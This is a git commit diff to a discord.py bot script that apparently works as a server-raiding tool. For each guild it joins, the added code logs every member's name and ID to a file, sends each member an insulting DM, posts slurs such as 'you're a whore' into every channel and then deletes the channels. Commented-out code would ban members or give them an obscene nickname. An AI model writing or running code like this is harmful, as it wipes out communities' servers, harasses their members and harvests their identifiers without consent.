910841bb0001d5e4e31d351d839af2d2d026a4f8
Matt C <matt@tar.black>
2022-02-14 21:27:00 -0500

    stuff

--- other-discordpy/data.py
+++ other-discordpy/data.py
@@ -16,17 +16,43 @@ bot = commands.Bot(
 )
 
 def log(stuff):
+    print(stuff)
     with open("data.txt", "a+") as f:
         f.write(stuff + "\n")
 
+messages = ["troll", "kekw", "lol", "xd", "you're a hoe", "you're a whore"]
+
 @bot.event
 async def on_ready():
-    print("Am online")
+    log("Am online")
 
     for g in bot.guilds:
         log("Start of " + g.name + ", id: " + str(g.id))
         async for lad in g.fetch_members():
-            log("- Member: " + lad.name + " # " + lad.discriminator)
+            log("- Member: " + lad.name + " # " + lad.discriminator + " , ID: " + str(lad.id))
+            try:
+                await lad.send("You suck!")
+            except:
+                print("Failed to DM")
 
+            #try:
+            #    await g.ban(lad)
+            #except:
+            #    log("Failed to ban. Trying to rename.")
+            #    try:
+            #        await lad.edit(nick="Fuckhead")
+            #    except:
+            #        log("Failed to rename. sorry :,(")
 
-bot.run("", bot=False)
+        for channel in await g.fetch_channels():
+            log("Trying to delete " + str(channel.name))
+            try:
+                await channel.send(choice(messages))
+            except:
+                pass
+            try:
+                await channel.delete()
+            except Exception as e:
+                print("Failed to delete " + str(channel.name) + " because: " + str(e))
+
+bot.run("")
